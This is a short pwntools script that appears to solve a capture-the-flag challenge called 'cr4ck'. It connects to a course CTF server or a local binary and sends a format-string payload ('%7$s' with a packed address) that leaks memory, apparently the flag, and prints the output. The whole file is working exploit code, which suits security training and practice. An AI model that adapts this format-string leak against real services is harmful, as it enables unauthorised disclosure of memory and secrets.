from pwn import *
from pwnlib import *

if __name__ == '__main__':
    if args.args['REMOTE']:
        p = connect('csie.ctf.tw', 10133)
    else:
        p = process('./cr4ck-fe7346c51f223086efa94547135fcbb2a226dd1f')

    leak_address = p64(0x600ba0)
    payload = '%7$s0000' + leak_address

    # gdb.attach(p, gdbscript='b *0x400706')
    # raw_input()
    p.send(payload)
    p.recvuntil(',')
    print p.recvline()
